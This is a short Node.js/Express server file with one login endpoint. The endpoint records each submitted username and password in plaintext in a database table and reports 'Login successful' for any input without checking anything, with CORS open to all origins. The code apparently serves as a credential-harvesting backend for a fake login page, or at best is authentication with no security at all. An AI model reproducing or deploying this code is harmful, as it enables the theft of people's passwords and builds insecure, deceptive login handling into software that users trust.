// index.js
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const pool = require('./db/Connection');  

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors({ origin: '*' }));
app.use(bodyParser.json());

app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password are required' });
  }

  try {
    await pool.query(
      'INSERT INTO login_attempts (username, password) VALUES ($1, $2)',
      [username, password]
    );

    return res.status(200).json({
      message: 'Login successful',
      user: { username }
    });
  } catch (error) {
    console.error('Database insert error:', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
